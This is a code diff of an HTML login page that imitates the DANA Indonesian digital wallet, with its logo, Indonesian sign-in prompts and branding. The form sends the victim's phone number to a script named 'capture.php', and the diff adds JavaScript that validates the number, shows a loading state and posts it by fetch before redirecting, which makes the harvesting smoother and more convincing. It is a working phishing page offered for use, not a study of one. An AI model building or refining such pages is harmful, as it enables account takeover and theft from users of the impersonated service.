@@ -24,27 +24,11 @@
             text-align: center;
             width: 100%;
             max-width: 360px;
-            transition: all 0.2s;
         }
-        .logo {
-            margin: 0 auto 16px;
-            display: block;
-        }
-        .greeting {
-            font-size: 22px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 6px;
-        }
-        .subtext {
-            font-size: 14px;
-            color: #777;
-            margin-bottom: 24px;
-        }
-        .input-group {
-            position: relative;
-            margin-bottom: 16px;
-        }
+        .logo { margin: 0 auto 16px; display: block; }
+        .greeting { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 6px; }
+        .subtext { font-size: 14px; color: #777; margin-bottom: 24px; }
+        .input-group { position: relative; margin-bottom: 16px; }
         .input-group input {
             width: 100%;
             padding: 16px 16px 16px 52px;
@@ -81,26 +65,15 @@
             transition: all 0.15s;
             margin-top: 8px;
         }
-        .btn-primary:active {
-            transform: scale(0.97);
-            box-shadow: 0 3px 10px rgba(0,153,255,0.25);
-        }
-        .footer-note {
-            font-size: 12px;
-            color: #aaa;
-            margin-top: 20px;
-            letter-spacing: 0.3px;
-        }
-        .divider {
-            border: none;
-            border-top: 1px solid #edf2f7;
-            margin: 20px 0 12px;
-        }
+        .btn-primary:active { transform: scale(0.97); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .footer-note { font-size: 12px; color: #aaa; margin-top: 20px; }
+        .divider { border: none; border-top: 1px solid #edf2f7; margin: 20px 0 12px; }
+        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 <div class="card">
-    <!-- Logo DANA dengan SVG -->
     <svg class="logo" viewBox="0 0 200 60" width="130" height="39">
         <defs>
             <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -116,9 +89,8 @@
     <div class="greeting">Masuk ke akun</div>
     <div class="subtext">Lanjutkan dengan nomor ponsel terdaftar</div>
 
-    <form action="capture.php" method="POST">
+    <form id="loginForm">
         <div class="input-group">
-            <!-- Ikon telepon SVG -->
             <span class="icon-left">
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.8">
                     <rect x="5" y="2" width="14" height="20" rx="3" stroke="currentColor"/>
@@ -126,13 +98,58 @@
                     <path d="M9 5h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
                 </svg>
             </span>
-            <input type="tel" name="phone" placeholder="Masukkan nomor HP" required>
+            <input type="tel" id="phone" name="phone" placeholder="Masukkan nomor HP" required>
         </div>
-        <button type="submit" class="btn-primary">Lanjutkan</button>
+        <button type="submit" class="btn-primary" id="submitBtn">Lanjutkan</button>
+        <div class="error-msg" id="errorMsg">Gagal terhubung, coba lagi.</div>
     </form>
 
     <hr class="divider">
     <div class="footer-note">DANA • Dompet Digital Indonesia</div>
 </div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const phone = document.getElementById('phone').value.trim();
+    const btn = document.getElementById('submitBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    
+    if (!phone || phone.length < 8) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Masukkan nomor HP yang valid.';
+        return;
+    }
+    
+    errorMsg.style.display = 'none';
+    btn.disabled = true;
+    btn.textContent = 'Memproses...';
+    
+    fetch('capture.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'phone=' + encodeURIComponent(phone)
+    })
+    .then(response => {
+        if (response.redirected) {
+            window.location.href = response.url;
+        } else {
+            return response.text();
+        }
+    })
+    .then(data => {
+        // Jika tidak redirect, cek apakah ada error
+        if (data && data.includes('error')) {
+            throw new Error('Server error');
+        }
+    })
+    .catch(() => {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Gagal terhubung ke server. Periksa koneksi.';
+        btn.disabled = false;
+        btn.textContent = 'Lanjutkan';
+    });
+});
+</script>
 </body>
 </html>
